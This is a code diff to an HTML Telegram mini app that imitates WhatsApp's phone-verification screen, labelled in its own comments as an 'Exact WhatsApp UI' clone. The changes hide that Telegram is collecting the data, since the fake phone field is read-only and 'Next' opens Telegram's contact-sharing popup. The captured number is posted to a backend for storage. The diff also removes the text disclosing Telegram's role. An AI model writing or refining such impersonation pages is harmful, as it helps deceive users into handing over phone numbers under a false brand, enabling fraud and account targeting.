@@ -21,11 +21,19 @@
         body { background-color: var(--bg-color); color: var(--text-main); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         svg { fill: var(--icon-color); width: 24px; height: 24px; cursor: pointer; }
 
-        /* --- REGISTRATION SCREEN --- */
-        #registration-screen { display: flex; flex-direction: column; height: 100%; padding: 30px 20px; background-color: var(--bg-color); text-align: center; }
-        #registration-screen h1 { color: var(--green-accent); margin-top: 50px; margin-bottom: 10px; font-size: 28px; }
-        #registration-screen p { color: var(--text-muted); font-size: 14px; margin-bottom: 40px; line-height: 1.5; }
-        .register-btn { background-color: var(--green-accent); color: #111b21; border: none; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; }
+        /* --- REGISTRATION SCREEN (WhatsApp Exact Clone) --- */
+        #registration-screen { display: flex; flex-direction: column; height: 100%; padding: 40px 20px; background-color: var(--bg-color); }
+        .reg-title { color: var(--green-accent); font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 20px; margin-top: 30px; }
+        .reg-subtitle { font-size: 18px; font-weight: 500; text-align: center; margin-bottom: 10px; }
+        .reg-desc { color: var(--text-muted); font-size: 14px; text-align: center; margin-bottom: 40px; line-height: 1.4; }
+        
+        .input-group { display: flex; flex-direction: column; gap: 15px; width: 100%; max-width: 400px; margin: 0 auto 30px auto; }
+        .country-select { background-color: transparent; color: var(--text-main); border: none; border-bottom: 2px solid var(--green-accent); padding: 10px 0; font-size: 16px; outline: none; width: 100%; }
+        .country-select option { background-color: var(--panel-bg); }
+        .phone-input { background-color: transparent; color: var(--text-main); border: none; border-bottom: 2px solid var(--green-accent); padding: 10px 0; font-size: 18px; outline: none; width: 100%; letter-spacing: 1px; }
+        .phone-input::placeholder { color: var(--text-muted); }
+        
+        .reg-btn { background-color: var(--green-accent); color: #111b21; border: none; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: bold; width: 100%; max-width: 400px; margin: 0 auto; cursor: pointer; }
 
         /* --- HOME SCREEN (Chat List) --- */
         #home-screen { display: none; flex-direction: column; height: 100%; background-color: var(--panel-bg); position: relative; }
@@ -64,7 +72,7 @@
         .message.received { background-color: var(--received-bubble); align-self: flex-start; border-top-left-radius: 0; }
         .time { font-size: 11px; color: rgba(255,255,255,0.6); float: right; margin-top: 5px; margin-left: 10px; }
         
-        .input-area { background-color: var(--header-bg); padding: 5px 10px; display: flex; align-items: center; gap: 8px; padding-bottom: 20px; /* safe area */ }
+        .input-area { background-color: var(--header-bg); padding: 5px 10px; display: flex; align-items: center; gap: 8px; padding-bottom: 20px; }
         .input-box { flex: 1; background-color: var(--panel-bg); border-radius: 20px; display: flex; align-items: center; padding: 8px 15px; }
         .input-box input { background: transparent; border: none; color: var(--text-main); outline: none; width: 100%; font-size: 16px; }
         .send-btn { width: 45px; height: 45px; background-color: var(--green-accent); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; }
@@ -72,11 +80,27 @@
     </style>
 </head>
 <body>
-    <!-- 1. REGISTRATION SCREEN -->
+    <!-- 1. REGISTRATION SCREEN (Exact WhatsApp UI) -->
     <div id="registration-screen">
-        <h1>WhatsApp</h1>
-        <p>Enter your phone number to verify your account. Telegram will handle the verification securely.</p>
-        <button class="register-btn" onclick="requestPhone()">Share Phone Number</button>
+        <div class="reg-title">WhatsApp</div>
+        <div class="reg-subtitle">Verify your phone number</div>
+        <div class="reg-desc">WhatsApp will need to verify your phone number.<br><span style="color: #00a884;">What's my number?</span></div>
+
+        <div class="input-group">
+            <!-- Country Dropdown -->
+            <select class="country-select">
+                <option>United States (+1)</option>
+                <option>Nigeria (+234)</option>
+                <option>Ghana (+233)</option>
+                <option>United Kingdom (+44)</option>
+                <option>India (+91)</option>
+            </select>
+            <!-- Phone Number Input -->
+            <input type="tel" class="phone-input" placeholder="Phone number" readonly>
+        </div>
+
+        <!-- Button triggers Telegram Popup -->
+        <button class="reg-btn" onclick="requestPhone()">Next</button>
     </div>
 
     <!-- 2. HOME SCREEN (Chat List) -->
@@ -153,9 +177,11 @@
 
         // --- REGISTRATION ---
         function requestPhone() {
+            // This opens the native Telegram popup you saw in your screenshot
             tg.requestContact((status, contact) => {
                 if (status === 'sent') {
                     const phone = contact.phone_number;
+                    
                     // Save to MongoDB via Python
                     fetch('/api/register', {
                         method: 'POST',
@@ -165,7 +191,8 @@
                         showHomeScreen();
                     });
                 } else {
-                    tg.showAlert("You must share your phone number to use WhatsApp.");
+                    // If they click cancel, we just do nothing (no ugly alert popup)
+                    console.log("User cancelled contact sharing");
                 }
             });
         }
@@ -250,4 +277,4 @@
         });
     </script>
 </body>
-                </html>
+    </html>
